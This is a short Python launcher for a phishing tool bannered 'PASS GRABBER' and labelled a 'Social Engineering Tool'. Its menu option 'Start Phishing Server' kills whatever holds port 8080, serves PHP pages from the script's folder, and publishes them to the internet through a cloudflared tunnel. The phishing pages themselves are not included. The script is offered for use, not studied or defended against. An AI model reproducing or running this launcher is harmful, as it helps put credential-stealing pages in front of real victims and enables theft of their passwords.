#!/usr/bin/env python3
import os
import time
import subprocess

# الألوان
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
PURPLE = "\033[95m"
CYAN   = "\033[96m"
WHITE  = "\033[97m"
RESET  = "\033[0m"

def start_pass_grabber():
    
    folder_path = os.path.dirname(os.path.realpath(__file__))
    os.chdir(folder_path) 

    os.system("clear")
    print(PURPLE + """
  ░█▀█░█▀█░█▀▀░█▀▀░░░█▀▀░█▀▄░█▀█░█▀▄░█▀▄░█▀▀░█▀▄
  ░█▀▀░█▀█░▀▀█░▀▀█░░░█░█░█▀▄░█▀█░█▀▄░█▀▄░█▀▀░█▀▄
  ░▀░░░▀░▀░▀▀▀░▀▀▀░░░▀▀▀░▀░▀░▀░▀░▀▀░░▀░▀░▀▀▀░▀░▀ 1.1.0
    """ + RESET)
    
    print(CYAN + "    " + "━" * 50 + RESET)
    print(YELLOW + "    [*] Target: Social Engineering Tool" + RESET)
    print(RED + "\n    [01] Start Phishing Server")
    print(RED + "    [00] Back to Menu")
    
    choice = input(CYAN + "\n    └───> " + RESET)

    if choice == "01" or choice == "1":
        print(YELLOW + "\n    [*] Initializing server in: " + WHITE + folder_path + RESET)
        
        
        os.system("fuser -k 8080/tcp > /dev/null 2>&1")
        
        
        os.system("php -S 127.0.0.1:8080 > /dev/null 2>&1 &")
        time.sleep(2)
        
        print(GREEN + "    [*] Cloudflare Tunnel is starting..." + RESET)
        os.system("cloudflared tunnel --url http://127.0.0.1:8080")
    else:
        return
